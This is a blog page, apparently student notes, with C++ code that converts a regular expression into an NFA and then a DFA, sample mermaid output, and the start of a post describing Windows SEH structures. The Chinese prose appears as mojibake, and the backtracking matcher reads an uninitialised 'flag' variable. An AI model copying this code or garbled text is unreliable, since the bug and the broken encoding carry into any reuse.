class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../e2t/e2t.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;t2n.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// #define start(handle) (handle.first)</span></span><br><span class="line"></span><br><span class="line">NFA::<span class="built_in">NFA</span>(Tree &amp;tree)</span><br><span class="line">&#123;</span><br><span class="line">    handle p = <span class="built_in">subNFA</span>(tree.root);</span><br><span class="line">    start = p.first;</span><br><span class="line">    finish = p.second;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">handle <span class="title">NFA::subNFA</span><span class="params">(TreeNode *o)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sta = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fin = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> op = o-&gt;<span class="built_in">getOp</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isCharacter</span>(op) || <span class="built_in">isNull</span>(op))</span><br><span class="line">    &#123;</span><br><span class="line">        sta = <span class="built_in">newNode</span>();</span><br><span class="line">        fin = <span class="built_in">newNode</span>();</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, fin, op));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isOr</span>(op))</span><br><span class="line">    &#123;</span><br><span class="line">        sta = <span class="built_in">newNode</span>();</span><br><span class="line">        handle left = <span class="built_in">subNFA</span>(o-&gt;left);</span><br><span class="line">        handle right = <span class="built_in">subNFA</span>(o-&gt;right);</span><br><span class="line">        fin = <span class="built_in">newNode</span>();</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, left.first, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, right.first, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[right.second].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(right.second, fin, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[left.second].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(left.second, fin, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isJoin</span>(op))</span><br><span class="line">    &#123;</span><br><span class="line">        handle left = <span class="built_in">subNFA</span>(o-&gt;left);</span><br><span class="line">        --cnt_nodes;</span><br><span class="line">        handle right = <span class="built_in">subNFA</span>(o-&gt;right);</span><br><span class="line">        sta = left.first;</span><br><span class="line">        fin = right.second;</span><br><span class="line">        <span class="comment">// nodes[left.second].addEdge(newEdge(left.second,right.first,&#x27;\0&#x27;));</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isClosure</span>(op))</span><br><span class="line">    &#123;</span><br><span class="line">        sta = <span class="built_in">newNode</span>();</span><br><span class="line">        handle sub = <span class="built_in">subNFA</span>(o-&gt;left);</span><br><span class="line">        fin = <span class="built_in">newNode</span>();</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, sub.first, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[sta].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sta, fin, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[sub.second].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sub.second, sub.first, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">        nodes[sub.second].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(sub.second, fin, <span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;invalid operator&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">handle</span>(sta, fin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">NFA::backtracing_judge</span><span class="params">(<span class="type">const</span> string &amp;expression)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    toJudge = expression;</span><br><span class="line">    tot_length = toJudge.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">backtracing_judge</span>(start,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">NFA::backtracing_judge</span><span class="params">(<span class="type">int</span> current_node, <span class="type">int</span> current_index)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    GraphNode &amp;node=nodes[current_node];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(current_index==tot_length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(current_node==finish)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> e:node.postEdges)&#123;</span><br><span class="line">            GraphEdge &amp;edge=edges[e];</span><br><span class="line">            c=edge.<span class="built_in">getCharacter</span>();</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">                flag=<span class="built_in">backtracing_judge</span>(edge.to,current_index);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> e : node.postEdges)</span><br><span class="line">    &#123;</span><br><span class="line">        GraphEdge &amp;edge = edges[e];</span><br><span class="line">        c = edge.<span class="built_in">getCharacter</span>();</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="built_in">backtracing_judge</span>(edge.to, current_index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (c == toJudge[current_index])</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="built_in">backtracing_judge</span>(edge.to, current_index + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">NFA::getEpsilon</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt; T)</span></span>&#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; s;</span><br><span class="line">    <span class="type">bool</span> visited[maxn];</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; epsilon;</span><br><span class="line">    <span class="built_in">memset</span>(visited,<span class="literal">false</span>,<span class="built_in">sizeof</span>(visited));</span><br><span class="line">    <span class="type">int</span> current_index;</span><br><span class="line">    <span class="type">int</span> next_index;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> u:T)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visited[u]==<span class="literal">false</span>)&#123;</span><br><span class="line">            visited[u]=<span class="literal">true</span>;</span><br><span class="line">            s.<span class="built_in">push</span>(u);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        current_index=s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">        epsilon.<span class="built_in">push_back</span>(current_index);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> e:nodes[current_index].postEdges)&#123;</span><br><span class="line">            GraphEdge &amp;edge=edges[e];</span><br><span class="line">            <span class="keyword">if</span>(edge.<span class="built_in">getCharacter</span>()==<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">                next_index=edge.<span class="built_in">getTo</span>();</span><br><span class="line">                <span class="keyword">if</span>(visited[next_index]==<span class="literal">false</span>)&#123;</span><br><span class="line">                    visited[next_index]=<span class="literal">true</span>;</span><br><span class="line">                    s.<span class="built_in">push</span>(next_index);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> epsilon;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»Sé›†åˆå¼€å§‹,ç»è¿‡characterå­—ç¬¦èƒ½å¤Ÿè½¬ç§»åˆ°çš„çŠ¶æ€é›†åˆ</span></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">NFA::smove</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt; S,<span class="type">char</span> character)</span></span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">    <span class="type">bool</span> visited[maxn];</span><br><span class="line">    <span class="built_in">memset</span>(visited,<span class="number">0</span>,<span class="built_in">sizeof</span>(visited));</span><br><span class="line">    <span class="type">int</span> next_index;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_index:S)&#123;</span><br><span class="line">        GraphNode &amp;node=nodes[current_index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> e:node.postEdges)&#123;</span><br><span class="line">            GraphEdge &amp;edge=edges[e];</span><br><span class="line">            next_index=edge.<span class="built_in">getTo</span>();</span><br><span class="line">            <span class="keyword">if</span>(edge.<span class="built_in">getCharacter</span>()==character&amp;&amp;visited[next_index]==<span class="literal">false</span>)&#123;</span><br><span class="line">                visited[next_index]=<span class="literal">true</span>;</span><br><span class="line">                result.<span class="built_in">push_back</span>(next_index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">NFA::no_backtracing_judge</span><span class="params">(<span class="type">const</span> std::string &amp;str)</span></span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; S=<span class="built_in">getEpsilon</span>(&#123;start&#125;);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> c:str)&#123;</span><br><span class="line">        S=<span class="built_in">getEpsilon</span>(<span class="built_in">smove</span>(S,c));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">find</span>(S.<span class="built_in">begin</span>(),S.<span class="built_in">end</span>(),finish)!=S.<span class="built_in">end</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="éªŒè¯">éªŒè¯</h3>
<p>ä¸ºäº†éªŒè¯ç®—æ³•æ­£ç¡®æ€§,infoå‡½æ•°ä¼šæ ¹æ®mermaid
graphå›¾çš„è¯­æ³•æ‰“å°,ç»“æœè´´åˆ°typora mermaidä»£ç å—ä¸­å³å¯å¯è§†åŒ–</p>
<p>è¾“å…¥çš„è¡¨è¾¾å¼æ˜¯<code>(a|b)*.a.b.b</code>,</p>
<p>ç¨‹åºçš„è¿è¡Œç»“æœæ˜¯</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">a b | * a . b . b . </span><br><span class="line">cnt_edges=13</span><br><span class="line">1((<span class="number">1</span>))</span><br><span class="line">2((<span class="number">2</span>))</span><br><span class="line">3((<span class="number">3</span>))</span><br><span class="line">4((<span class="number">4</span>))</span><br><span class="line">5((<span class="number">5</span>))</span><br><span class="line">6((<span class="number">6</span>))</span><br><span class="line">7((<span class="number">7</span>))</span><br><span class="line">8((<span class="number">8</span>))</span><br><span class="line">9((<span class="number">9</span>))</span><br><span class="line">10((<span class="number">10</span>))</span><br><span class="line">11((<span class="number">11</span>))</span><br><span class="line"></span><br><span class="line">3--a--&gt;4</span><br><span class="line">5--b--&gt;6</span><br><span class="line">2----&gt;3</span><br><span class="line">2----&gt;5</span><br><span class="line">4----&gt;7</span><br><span class="line">6----&gt;7</span><br><span class="line">1----&gt;2</span><br><span class="line">1----&gt;8</span><br><span class="line">7----&gt;2</span><br><span class="line">7----&gt;8</span><br><span class="line">8--a--&gt;9</span><br><span class="line">9--b--&gt;10</span><br><span class="line">10--b--&gt;11</span><br></pre></td></tr></table></figure>
<p>æŠŠå…¶ä¸­çš„mermaidè¯­æ³•æŠ å‡ºæ¥ä¹åˆ°typora mermaidä»£ç å—ä¸­å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">    1((1))</span><br><span class="line">    2((2))</span><br><span class="line">    3((3))</span><br><span class="line">    4((4))</span><br><span class="line">    5((5))</span><br><span class="line">    6((6))</span><br><span class="line">    7((7))</span><br><span class="line">    8((8))</span><br><span class="line">    9((9))</span><br><span class="line">    10((10))</span><br><span class="line">    11((11))</span><br><span class="line"></span><br><span class="line">    3--a--&gt;4</span><br><span class="line">    5--b--&gt;6</span><br><span class="line">    2----&gt;3</span><br><span class="line">    2----&gt;5</span><br><span class="line">    4----&gt;7</span><br><span class="line">    6----&gt;7</span><br><span class="line">    1----&gt;2</span><br><span class="line">    1----&gt;8</span><br><span class="line">    7----&gt;2</span><br><span class="line">    7----&gt;8</span><br><span class="line">    8--a--&gt;9</span><br><span class="line">    9--b--&gt;10</span><br><span class="line">    10--b--&gt;11</span><br></pre></td></tr></table></figure>
<p>æ•™æä¸Šç»™å‡ºçš„NFAå›¾æ˜¯</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221019120541112.png"
alt="image-20221019120541112" />
<figcaption aria-hidden="true">image-20221019120541112</figcaption>
</figure>
<p>æˆ‘ä»1å¼€å§‹ç»™èŠ‚ç‚¹ç¼–å·,æ•™æä»0å¼€å§‹ç»™èŠ‚ç‚¹ç¼–å·</p>
<p>æ˜¾ç„¶ç»“æ„æ˜¯ç›¸åŒçš„</p>
<h2 id="n2d">n2d</h2>
<p>DFAä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯NFAçš„çŠ¶æ€é›†åˆ,ä½†æ˜¯DFAå»ºç«‹ä¹‹åå°±ä¸éœ€è¦NFAçš„çŠ¶æ€äº†</p>
<p>åªéœ€è¦ç»´æŠ¤è¾¹ä¸Šçš„å­—ç¬¦</p>
<p>ä½¿ç”¨mapåˆ¤å®šä¸€ä¸ªçŠ¶æ€é›†åˆæ˜¯å¦å·²ç»å­˜åœ¨è¿‡</p>
<h3 id="dfa.h">DFA.h</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Graph.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;NFA.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DFA</span>:</span>public Graph&#123;</span><br><span class="line">    NFA &amp;nfa;</span><br><span class="line">    </span><br><span class="line">    DFA(NFA &amp;n);</span><br><span class="line"></span><br><span class="line">    friend <span class="built_in">std</span>::ostream &amp;operator&lt;&lt;(<span class="built_in">std</span>::ostream &amp;os,DFA &amp;dfa);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="dfa.cpp">DFA.cpp</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DFA.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;NFA.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> std::pair&lt;std::vector&lt;HNODE&gt;,HNODE&gt; Record;</span><br><span class="line">DFA::<span class="built_in">DFA</span>(NFA &amp;n):<span class="built_in">nfa</span>(n)&#123;</span><br><span class="line">    <span class="built_in">newNode</span>(<span class="built_in">GraphNode</span>());</span><br><span class="line">    std::map&lt;std::vector&lt;HNODE&gt;,HNODE&gt; table;</span><br><span class="line">    std::queue&lt;std::vector&lt;HNODE&gt; &gt; q;</span><br><span class="line">    HNODE hNode_current;</span><br><span class="line">    HNODE hNode_next;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;HNODE&gt; current_statements=nfa.<span class="built_in">getEpsilon</span>(&#123;nfa.hNode_start&#125;);</span><br><span class="line">    hNode_current=<span class="built_in">newNode</span>(<span class="built_in">GraphNode</span>());</span><br><span class="line">    std::vector&lt;HNODE&gt; next_statments;</span><br><span class="line">    table.<span class="built_in">insert</span>(<span class="built_in">Record</span>(current_statements,hNode_current));</span><br><span class="line">    q.<span class="built_in">push</span>(current_statements);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        current_statements=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        hNode_current=table[current_statements];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;c&lt;=<span class="string">&#x27;z&#x27;</span>;++c)&#123;</span><br><span class="line">            next_statments=nfa.<span class="built_in">getEpsilon</span>(nfa.<span class="built_in">smove</span>(current_statements,c));</span><br><span class="line">            <span class="keyword">if</span>(next_statments.<span class="built_in">empty</span>())<span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(table.<span class="built_in">find</span>(next_statments)==table.<span class="built_in">end</span>())&#123;</span><br><span class="line">                hNode_next=<span class="built_in">newNode</span>(<span class="built_in">GraphNode</span>());</span><br><span class="line">                table.<span class="built_in">insert</span>(<span class="built_in">Record</span>(next_statments,hNode_next));</span><br><span class="line">                q.<span class="built_in">push</span>(next_statments);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                hNode_next=table[next_statments];</span><br><span class="line">            &#125;</span><br><span class="line">            nodes[hNode_current].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(<span class="built_in">GraphEdge</span>(hNode_current,hNode_next,c)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;os,DFA &amp;dfa)&#123;</span><br><span class="line">    <span class="keyword">for</span>(HNODE hNode=<span class="number">1</span>;hNode&lt;dfa.nodes.<span class="built_in">size</span>();hNode++)&#123;</span><br><span class="line">        os&lt;&lt;hNode&lt;&lt;<span class="string">&quot;((&quot;</span>&lt;&lt;hNode&lt;&lt;<span class="string">&quot;))&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> edge:dfa.edges)&#123;</span><br><span class="line">        os&lt;&lt;edge&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>éªŒè¯</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110095752738.png"
alt="image-20221110095752738" />
<figcaption aria-hidden="true">image-20221110095752738</figcaption>
</figure>
<h2 id="dfaæœ€å°åŒ–">DFAæœ€å°åŒ–</h2>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/24/SEH/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/24/SEH/" class="post-title-link" itemprop="url">SEH</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-24 23:44:00 / Modified: 23:44:44" itemprop="dateCreated datePublished" datetime="2022-09-24T23:44:00+08:00">2022-09-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="seh">SEH</h1>
<p>windowså¼‚å¸¸å¤„ç†ç¨‹åº,å­˜å‚¨åœ¨<strong>æ ˆä¸­</strong></p>
<h2 id="sehé“¾">SEHé“¾</h2>
<p>SEHé“¾å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªé“¾è¡¨,å…¶åŸºæœ¬å•ä½æ˜¯ä¸€ä¸ªä¸ªçš„èŠ‚ç‚¹</p>
<p>æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯ç”±ä¸€ä¸ªåå‘æŒ‡é’ˆ(æŒ‡é’ˆåŸŸ)å’Œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ(å€¼åŸŸ)ç»„æˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span><span class="comment">//æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;<span class="comment">//æŒ‡å‘å‡½æ•°</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>
<p>Nextä¸å¿…å¤šè¯´,Handleræ˜¯ä¸€ä¸ªæœ‰å›ºå®šæ ¼å¼çš„å‡½æ•°,å…¶å‡½æ•°æ¥å£é•¿è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION <span class="title function_">myHandler</span><span class="params">(<span class="comment">//è¿”å›å€¼ä¸ºæšä¸¾ç±»å‹,è¡¨æ˜æœ¬å‡½æ•°å¤„ç†ç»“æŸåç¨‹åºçš„èµ°å‘</span></span></span><br><span class="line"><span class="params">    EXCEPTION_RECORD *pRecord,</span></span><br><span class="line"><span class="params">    EXCEPTION_REGISTRATION_RECORD *pFrame,</span></span><br><span class="line"><span class="params">    PCONTEXT Context,<span class="comment">//çº¿ç¨‹ä¸Šä¸‹æ–‡,åŒ…æ‹¬å„ç§å¯„å­˜å™¨å€¼</span></span></span><br><span class="line"><span class="params">    PVOID pValue,</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™å››ä¸ªå‚æ•°ä¼šç”±OSä¼ ç»™å¼‚å¸¸å¤„ç†å‡½æ•°</p>
